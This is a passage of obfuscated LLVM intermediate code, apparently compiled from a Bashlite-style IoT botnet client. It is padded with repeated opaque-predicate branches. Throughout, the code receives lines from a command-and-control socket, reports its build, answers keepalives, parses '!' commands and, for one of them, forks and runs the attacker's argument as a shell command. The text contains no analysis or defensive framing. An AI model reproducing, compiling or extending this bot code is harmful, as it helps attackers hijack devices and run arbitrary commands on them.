  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %152

; <label>:173:                                    ; preds = %152
  %174 = load i32, i32* @mainCommSock, align 4
  %175 = call i8* @getBuild()
  %176 = call i32 (i32, i8*, ...) @sockprintf(i32 %174, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.64, i32 0, i32 0), i8* %175)
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  br label %177

; <label>:177:                                    ; preds = %796, %originalBBpart2125, %originalBBpart291, %originalBBpart275, %173
  %178 = load i32, i32* @x.81
  %179 = load i32, i32* @y.82
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %177
  %186 = load i32, i32* @mainCommSock, align 4
  %187 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %188 = call i32 @recvLine(i32 %186, i8* %187, i32 4096)
  store i32 %188, i32* %19, align 4
  %189 = icmp ne i32 %188, -1
  %190 = load i32, i32* @x.81
  %191 = load i32, i32* @y.82
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %189, label %198, label %797

; <label>:198:                                    ; preds = %originalBBpart239
  store i32 0, i32* %20, align 4
  br label %199

; <label>:199:                                    ; preds = %318, %198
  %200 = load i32, i32* %20, align 4
  %201 = sext i32 %200 to i64
  %202 = load i64, i64* @numpids, align 8
  %203 = icmp ult i64 %201, %202
  br i1 %203, label %204, label %321

; <label>:204:                                    ; preds = %199
  %205 = load i32, i32* @x.81
  %206 = load i32, i32* @y.82
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %204
  %213 = load i32*, i32** @pids, align 8
  %214 = load i32, i32* %20, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds i32, i32* %213, i64 %215
  %217 = load i32, i32* %216, align 4
  %218 = call i32 @waitpid(i32 %217, i32* null, i32 1)
  %219 = icmp sgt i32 %218, 0
  %220 = load i32, i32* @x.81
  %221 = load i32, i32* @y.82
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %219, label %228, label %317

; <label>:228:                                    ; preds = %originalBBpart243
  %229 = load i32, i32* %20, align 4
  %230 = add nsw i32 %229, 1
  store i32 %230, i32* %22, align 4
  br label %231

; <label>:231:                                    ; preds = %247, %228
  %232 = load i32, i32* %22, align 4
  %233 = zext i32 %232 to i64
  %234 = load i64, i64* @numpids, align 8
  %235 = icmp ult i64 %233, %234
  br i1 %235, label %236, label %250

; <label>:236:                                    ; preds = %231
  %237 = load i32*, i32** @pids, align 8
  %238 = load i32, i32* %22, align 4
  %239 = zext i32 %238 to i64
  %240 = getelementptr inbounds i32, i32* %237, i64 %239
  %241 = load i32, i32* %240, align 4
  %242 = load i32*, i32** @pids, align 8
  %243 = load i32, i32* %22, align 4
  %244 = sub i32 %243, 1
  %245 = zext i32 %244 to i64
  %246 = getelementptr inbounds i32, i32* %242, i64 %245
  store i32 %241, i32* %246, align 4
  br label %247

; <label>:247:                                    ; preds = %236
  %248 = load i32, i32* %22, align 4
  %249 = add i32 %248, 1
  store i32 %249, i32* %22, align 4
  br label %231

; <label>:250:                                    ; preds = %231
  %251 = load i32, i32* @x.81
  %252 = load i32, i32* @y.82
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %250
  %259 = load i32*, i32** @pids, align 8
  %260 = load i32, i32* %22, align 4
  %261 = sub i32 %260, 1
  %262 = zext i32 %261 to i64
  %263 = getelementptr inbounds i32, i32* %259, i64 %262
  store i32 0, i32* %263, align 4
  %264 = load i64, i64* @numpids, align 8
  %265 = add i64 %264, -1
  store i64 %265, i64* @numpids, align 8
  %266 = load i64, i64* @numpids, align 8
  %267 = add i64 %266, 1
  %268 = mul i64 %267, 4
  %269 = call noalias i8* @malloc(i64 %268) #2
  %270 = bitcast i8* %269 to i32*
  store i32* %270, i32** %21, align 8
  store i32 0, i32* %22, align 4
  %271 = load i32, i32* @x.81
  %272 = load i32, i32* @y.82
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBBpart267, label %originalBB45alteredBB

originalBBpart267:                                ; preds = %originalBB45
  br label %279

; <label>:279:                                    ; preds = %294, %originalBBpart267
  %280 = load i32, i32* %22, align 4
  %281 = zext i32 %280 to i64
  %282 = load i64, i64* @numpids, align 8
  %283 = icmp ult i64 %281, %282
  br i1 %283, label %284, label %297

; <label>:284:                                    ; preds = %279
  %285 = load i32*, i32** @pids, align 8
  %286 = load i32, i32* %22, align 4
  %287 = zext i32 %286 to i64
  %288 = getelementptr inbounds i32, i32* %285, i64 %287
  %289 = load i32, i32* %288, align 4
  %290 = load i32*, i32** %21, align 8
  %291 = load i32, i32* %22, align 4
  %292 = zext i32 %291 to i64
  %293 = getelementptr inbounds i32, i32* %290, i64 %292
  store i32 %289, i32* %293, align 4
  br label %294

; <label>:294:                                    ; preds = %284
  %295 = load i32, i32* %22, align 4
  %296 = add i32 %295, 1
  store i32 %296, i32* %22, align 4
  br label %279

; <label>:297:                                    ; preds = %279
  %298 = load i32, i32* @x.81
  %299 = load i32, i32* @y.82
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %297
  %306 = load i32*, i32** @pids, align 8
  %307 = bitcast i32* %306 to i8*
  call void @free(i8* %307) #2
  %308 = load i32*, i32** %21, align 8
  store i32* %308, i32** @pids, align 8
  %309 = load i32, i32* @x.81
  %310 = load i32, i32* @y.82
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %317

; <label>:317:                                    ; preds = %originalBBpart271, %originalBBpart243
  br label %318

; <label>:318:                                    ; preds = %317
  %319 = load i32, i32* %20, align 4
  %320 = add nsw i32 %319, 1
  store i32 %320, i32* %20, align 4
  br label %199

; <label>:321:                                    ; preds = %199
  %322 = load i32, i32* %19, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i64 0, i64 %323
  store i8 0, i8* %324, align 1
  %325 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %325)
  %326 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %327 = call i8* @strstr(i8* %326, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0)) #10
  %328 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %329 = icmp eq i8* %327, %328
  br i1 %329, label %330, label %349

; <label>:330:                                    ; preds = %321
  %331 = load i32, i32* @x.81
  %332 = load i32, i32* @y.82
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %330
  %339 = load i32, i32* @mainCommSock, align 4
  %340 = call i32 (i32, i8*, ...) @sockprintf(i32 %339, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0))
  %341 = load i32, i32* @x.81
  %342 = load i32, i32* @y.82
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %177

; <label>:349:                                    ; preds = %321
  %350 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %351 = call i8* @strstr(i8* %350, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0)) #10
  %352 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %353 = icmp eq i8* %351, %352
  br i1 %353, label %354, label %355

; <label>:354:                                    ; preds = %349
  call void @exit(i32 0) #14
  unreachable

; <label>:355:                                    ; preds = %349
  %356 = load i32, i32* @x.81
  %357 = load i32, i32* @y.82
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %355
  %364 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  store i8* %364, i8** %23, align 8
  %365 = load i8*, i8** %23, align 8
  %366 = load i8, i8* %365, align 1
  %367 = zext i8 %366 to i32
  %368 = icmp eq i32 %367, 33
  %369 = load i32, i32* @x.81
  %370 = load i32, i32* @y.82
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br i1 %368, label %377, label %796

; <label>:377:                                    ; preds = %originalBBpart279
  %378 = load i8*, i8** %23, align 8
  %379 = getelementptr inbounds i8, i8* %378, i64 1
  store i8* %379, i8** %24, align 8
  br label %380

; <label>:380:                                    ; preds = %424, %377
  %381 = load i8*, i8** %24, align 8
  %382 = load i8, i8* %381, align 1
  %383 = zext i8 %382 to i32
  %384 = icmp ne i32 %383, 32
  br i1 %384, label %385, label %406

; <label>:385:                                    ; preds = %380
  %386 = load i32, i32* @x.81
  %387 = load i32, i32* @y.82
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %385
  %394 = load i8*, i8** %24, align 8
  %395 = load i8, i8* %394, align 1
  %396 = zext i8 %395 to i32
  %397 = icmp ne i32 %396, 0
  %398 = load i32, i32* @x.81
  %399 = load i32, i32* @y.82
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br label %406

; <label>:406:                                    ; preds = %originalBBpart283, %380
  %407 = phi i1 [ false, %380 ], [ %397, %originalBBpart283 ]
  %408 = load i32, i32* @x.81
  %409 = load i32, i32* @y.82
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %406
  %416 = load i32, i32* @x.81
  %417 = load i32, i32* @y.82
  %418 = sub i32 %416, 1
  %419 = mul i32 %416, %418
  %420 = urem i32 %419, 2
  %421 = icmp eq i32 %420, 0
  %422 = icmp slt i32 %417, 10
  %423 = or i1 %421, %422
  br i1 %423, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br i1 %407, label %424, label %427

; <label>:424:                                    ; preds = %originalBBpart287
  %425 = load i8*, i8** %24, align 8
  %426 = getelementptr inbounds i8, i8* %425, i32 1
  store i8* %426, i8** %24, align 8
  br label %380

; <label>:427:                                    ; preds = %originalBBpart287
  %428 = load i8*, i8** %24, align 8
  %429 = load i8, i8* %428, align 1
  %430 = zext i8 %429 to i32
  %431 = icmp eq i32 %430, 0
  br i1 %431, label %432, label %449

; <label>:432:                                    ; preds = %427
  %433 = load i32, i32* @x.81
  %434 = load i32, i32* @y.82
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %432
  %441 = load i32, i32* @x.81
  %442 = load i32, i32* @y.82
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br label %177

; <label>:449:                                    ; preds = %427
  %450 = load i32, i32* @x.81
  %451 = load i32, i32* @y.82
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %449
  %458 = load i8*, i8** %24, align 8
  store i8 0, i8* %458, align 1
  %459 = load i8*, i8** %23, align 8
  %460 = getelementptr inbounds i8, i8* %459, i64 1
  store i8* %460, i8** %24, align 8
  %461 = load i8*, i8** %23, align 8
  %462 = load i8*, i8** %24, align 8
  %463 = call i64 @strlen(i8* %462) #10
  %464 = getelementptr inbounds i8, i8* %461, i64 %463
  %465 = getelementptr inbounds i8, i8* %464, i64 2
  store i8* %465, i8** %23, align 8
  %466 = load i32, i32* @x.81
  %467 = load i32, i32* @y.82
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br label %474

; <label>:474:                                    ; preds = %510, %originalBBpart295
  %475 = load i32, i32* @x.81
  %476 = load i32, i32* @y.82
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %474
  %483 = load i8*, i8** %23, align 8
  %484 = load i8*, i8** %23, align 8
  %485 = call i64 @strlen(i8* %484) #10
  %486 = sub i64 %485, 1
  %487 = getelementptr inbounds i8, i8* %483, i64 %486
  %488 = load i8, i8* %487, align 1
  %489 = zext i8 %488 to i32
  %490 = icmp eq i32 %489, 10
  %491 = load i32, i32* @x.81
  %492 = load i32, i32* @y.82
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBBpart2105, label %originalBB97alteredBB

originalBBpart2105:                               ; preds = %originalBB97
  br i1 %490, label %508, label %499

; <label>:499:                                    ; preds = %originalBBpart2105
  %500 = load i8*, i8** %23, align 8
  %501 = load i8*, i8** %23, align 8
  %502 = call i64 @strlen(i8* %501) #10
  %503 = sub i64 %502, 1
  %504 = getelementptr inbounds i8, i8* %500, i64 %503
  %505 = load i8, i8* %504, align 1
  %506 = zext i8 %505 to i32
  %507 = icmp eq i32 %506, 13
  br label %508

; <label>:508:                                    ; preds = %499, %originalBBpart2105
  %509 = phi i1 [ true, %originalBBpart2105 ], [ %507, %499 ]
  br i1 %509, label %510, label %516

; <label>:510:                                    ; preds = %508
  %511 = load i8*, i8** %23, align 8
  %512 = load i8*, i8** %23, align 8
  %513 = call i64 @strlen(i8* %512) #10
  %514 = sub i64 %513, 1
  %515 = getelementptr inbounds i8, i8* %511, i64 %514
  store i8 0, i8* %515, align 1
  br label %474

; <label>:516:                                    ; preds = %508
  %517 = load i8*, i8** %23, align 8
  store i8* %517, i8** %25, align 8
  br label %518

; <label>:518:                                    ; preds = %562, %516
  %519 = load i32, i32* @x.81
  %520 = load i32, i32* @y.82
  %521 = sub i32 %519, 1
  %522 = mul i32 %519, %521
  %523 = urem i32 %522, 2
  %524 = icmp eq i32 %523, 0
  %525 = icmp slt i32 %520, 10
  %526 = or i1 %524, %525
  br i1 %526, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %518
  %527 = load i8*, i8** %23, align 8
  %528 = load i8, i8* %527, align 1
  %529 = zext i8 %528 to i32
  %530 = icmp ne i32 %529, 32
  %531 = load i32, i32* @x.81
  %532 = load i32, i32* @y.82
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br i1 %530, label %539, label %560

; <label>:539:                                    ; preds = %originalBBpart2109
  %540 = load i32, i32* @x.81
  %541 = load i32, i32* @y.82
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %539
  %548 = load i8*, i8** %23, align 8
  %549 = load i8, i8* %548, align 1
  %550 = zext i8 %549 to i32
  %551 = icmp ne i32 %550, 0
  %552 = load i32, i32* @x.81
  %553 = load i32, i32* @y.82
  %554 = sub i32 %552, 1
  %555 = mul i32 %552, %554
  %556 = urem i32 %555, 2
  %557 = icmp eq i32 %556, 0
  %558 = icmp slt i32 %553, 10
  %559 = or i1 %557, %558
  br i1 %559, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  br label %560

; <label>:560:                                    ; preds = %originalBBpart2113, %originalBBpart2109
  %561 = phi i1 [ false, %originalBBpart2109 ], [ %551, %originalBBpart2113 ]
  br i1 %561, label %562, label %565

; <label>:562:                                    ; preds = %560
  %563 = load i8*, i8** %23, align 8
  %564 = getelementptr inbounds i8, i8* %563, i32 1
  store i8* %564, i8** %23, align 8
  br label %518

; <label>:565:                                    ; preds = %560
  %566 = load i32, i32* @x.81
  %567 = load i32, i32* @y.82
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBB115, label %originalBB115alteredBB

originalBB115:                                    ; preds = %originalBB115alteredBB, %565
  %574 = load i8*, i8** %23, align 8
  store i8 0, i8* %574, align 1
  %575 = load i8*, i8** %23, align 8
  %576 = getelementptr inbounds i8, i8* %575, i32 1
  store i8* %576, i8** %23, align 8
  %577 = load i8*, i8** %25, align 8
  store i8* %577, i8** %26, align 8
  %578 = load i32, i32* @x.81
  %579 = load i32, i32* @y.82
  %580 = sub i32 %578, 1
  %581 = mul i32 %578, %580
  %582 = urem i32 %581, 2
  %583 = icmp eq i32 %582, 0
  %584 = icmp slt i32 %579, 10
  %585 = or i1 %583, %584
  br i1 %585, label %originalBBpart2117, label %originalBB115alteredBB

originalBBpart2117:                               ; preds = %originalBB115
  br label %586

; <label>:586:                                    ; preds = %originalBBpart2121, %originalBBpart2117
  %587 = load i8*, i8** %26, align 8
  %588 = load i8, i8* %587, align 1
  %589 = icmp ne i8 %588, 0
  br i1 %589, label %590, label %615

; <label>:590:                                    ; preds = %586
  %591 = load i32, i32* @x.81
  %592 = load i32, i32* @y.82
  %593 = sub i32 %591, 1
  %594 = mul i32 %591, %593
  %595 = urem i32 %594, 2
  %596 = icmp eq i32 %595, 0
  %597 = icmp slt i32 %592, 10
  %598 = or i1 %596, %597
  br i1 %598, label %originalBB119, label %originalBB119alteredBB

originalBB119:                                    ; preds = %originalBB119alteredBB, %590
  %599 = load i8*, i8** %26, align 8
  %600 = load i8, i8* %599, align 1
  %601 = zext i8 %600 to i32
  %602 = call i32 @toupper(i32 %601) #10
  %603 = trunc i32 %602 to i8
  %604 = load i8*, i8** %26, align 8
  store i8 %603, i8* %604, align 1
  %605 = load i8*, i8** %26, align 8
  %606 = getelementptr inbounds i8, i8* %605, i32 1
  store i8* %606, i8** %26, align 8
  %607 = load i32, i32* @x.81
  %608 = load i32, i32* @y.82
  %609 = sub i32 %607, 1
  %610 = mul i32 %607, %609
  %611 = urem i32 %610, 2
  %612 = icmp eq i32 %611, 0
  %613 = icmp slt i32 %608, 10
  %614 = or i1 %612, %613
  br i1 %614, label %originalBBpart2121, label %originalBB119alteredBB

originalBBpart2121:                               ; preds = %originalBB119
  br label %586

; <label>:615:                                    ; preds = %586
  %616 = load i8*, i8** %25, align 8
  %617 = call i32 @strcmp(i8* %616, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.67, i32 0, i32 0)) #10
  %618 = icmp eq i32 %617, 0
  br i1 %618, label %619, label %658

; <label>:619:                                    ; preds = %615
  %620 = call i32 @listFork()
  %621 = icmp ne i32 %620, 0
  br i1 %621, label %622, label %639

; <label>:622:                                    ; preds = %619
  %623 = load i32, i32* @x.81
  %624 = load i32, i32* @y.82
  %625 = sub i32 %623, 1
  %626 = mul i32 %623, %625
  %627 = urem i32 %626, 2
  %628 = icmp eq i32 %627, 0
  %629 = icmp slt i32 %624, 10
  %630 = or i1 %628, %629
  br i1 %630, label %originalBB123, label %originalBB123alteredBB

originalBB123:                                    ; preds = %originalBB123alteredBB, %622
  %631 = load i32, i32* @x.81
  %632 = load i32, i32* @y.82
  %633 = sub i32 %631, 1
  %634 = mul i32 %631, %633
  %635 = urem i32 %634, 2
  %636 = icmp eq i32 %635, 0
  %637 = icmp slt i32 %632, 10
  %638 = or i1 %636, %637
  br i1 %638, label %originalBBpart2125, label %originalBB123alteredBB

originalBBpart2125:                               ; preds = %originalBB123
  br label %177

; <label>:639:                                    ; preds = %619
  %640 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %640, i8 0, i64 1024, i32 16, i1 false)
  %641 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  %642 = load i8*, i8** %23, align 8
  %643 = call i32 (i8*, i8*, ...) @szprintf(i8* %641, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.68, i32 0, i32 0), i8* %642)
  %644 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  %645 = call i32 @fdpopen(i8* %644, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i32 0, i32 0))
  store i32 %645, i32* %28, align 4
  br label %646

; <label>:646:                                    ; preds = %651, %639
  %647 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  %648 = load i32, i32* %28, align 4
  %649 = call i8* @fdgets(i8* %647, i32 1024, i32 %648)
  %650 = icmp ne i8* %649, null
  br i1 %650, label %651, label %655

; <label>:651:                                    ; preds = %646
  %652 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  call void @trim(i8* %652)
  %653 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %653, i8 0, i64 1024, i32 16, i1 false)
  %654 = call i32 @sleep(i32 1)
  br label %646

; <label>:655:                                    ; preds = %646
  %656 = load i32, i32* %28, align 4
  %657 = call i32 @fdpclose(i32 %656)
  call void @exit(i32 0) #14
  unreachable

; <label>:658:                                    ; preds = %615
  store i32 1, i32* %30, align 4
  %659 = load i8*, i8** %23, align 8
  %660 = call i8* @strtok(i8* %659, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0)) #2
  store i8* %660, i8** %31, align 8
  %661 = load i8*, i8** %25, align 8
  %662 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 0
  store i8* %661, i8** %662, align 16
  br label %663

; <label>:663:                                    ; preds = %originalBBpart2168, %658
  %664 = load i32, i32* @x.81
  %665 = load i32, i32* @y.82
  %666 = sub i32 %664, 1
  %667 = mul i32 %664, %666
  %668 = urem i32 %667, 2
  %669 = icmp eq i32 %668, 0
  %670 = icmp slt i32 %665, 10
  %671 = or i1 %669, %670
  br i1 %671, label %originalBB127, label %originalBB127alteredBB

originalBB127:                                    ; preds = %originalBB127alteredBB, %663
  %672 = load i8*, i8** %31, align 8
  %673 = icmp ne i8* %672, null
  %674 = load i32, i32* @x.81
  %675 = load i32, i32* @y.82
  %676 = sub i32 %674, 1
  %677 = mul i32 %674, %676
  %678 = urem i32 %677, 2
  %679 = icmp eq i32 %678, 0
  %680 = icmp slt i32 %675, 10
  %681 = or i1 %679, %680
  br i1 %681, label %originalBBpart2129, label %originalBB127alteredBB

originalBBpart2129:                               ; preds = %originalBB127
  br i1 %673, label %682, label %744

; <label>:682:                                    ; preds = %originalBBpart2129
  %683 = load i8*, i8** %31, align 8
  %684 = load i8, i8* %683, align 1
  %685 = zext i8 %684 to i32
  %686 = icmp ne i32 %685, 10
  br i1 %686, label %687, label %726

; <label>:687:                                    ; preds = %682
  %688 = load i32, i32* @x.81
  %689 = load i32, i32* @y.82
  %690 = sub i32 %688, 1
  %691 = mul i32 %688, %690
  %692 = urem i32 %691, 2
  %693 = icmp eq i32 %692, 0
  %694 = icmp slt i32 %689, 10
  %695 = or i1 %693, %694
  br i1 %695, label %originalBB131, label %originalBB131alteredBB

originalBB131:                                    ; preds = %originalBB131alteredBB, %687
  %696 = load i8*, i8** %31, align 8
  %697 = call i64 @strlen(i8* %696) #10
  %698 = add i64 %697, 1
  %699 = call noalias i8* @malloc(i64 %698) #2
  %700 = load i32, i32* %30, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %701
  store i8* %699, i8** %702, align 8
  %703 = load i32, i32* %30, align 4
  %704 = sext i32 %703 to i64
  %705 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %704
  %706 = load i8*, i8** %705, align 8
  %707 = load i8*, i8** %31, align 8
  %708 = call i64 @strlen(i8* %707) #10
  %709 = add i64 %708, 1
  call void @llvm.memset.p0i8.i64(i8* %706, i8 0, i64 %709, i32 1, i1 false)
  %710 = load i32, i32* %30, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %711
  %713 = load i8*, i8** %712, align 8
  %714 = load i8*, i8** %31, align 8
  %715 = call i8* @strcpy(i8* %713, i8* %714) #2
  %716 = load i32, i32* %30, align 4
  %717 = add nsw i32 %716, 1
  store i32 %717, i32* %30, align 4
  %718 = load i32, i32* @x.81
  %719 = load i32, i32* @y.82
  %720 = sub i32 %718, 1
  %721 = mul i32 %718, %720
  %722 = urem i32 %721, 2
  %723 = icmp eq i32 %722, 0
  %724 = icmp slt i32 %719, 10
  %725 = or i1 %723, %724
  br i1 %725, label %originalBBpart2164, label %originalBB131alteredBB

originalBBpart2164:                               ; preds = %originalBB131
  br label %726

; <label>:726:                                    ; preds = %originalBBpart2164, %682
  %727 = load i32, i32* @x.81
  %728 = load i32, i32* @y.82
  %729 = sub i32 %727, 1
  %730 = mul i32 %727, %729
  %731 = urem i32 %730, 2
  %732 = icmp eq i32 %731, 0
  %733 = icmp slt i32 %728, 10
  %734 = or i1 %732, %733
  br i1 %734, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %726
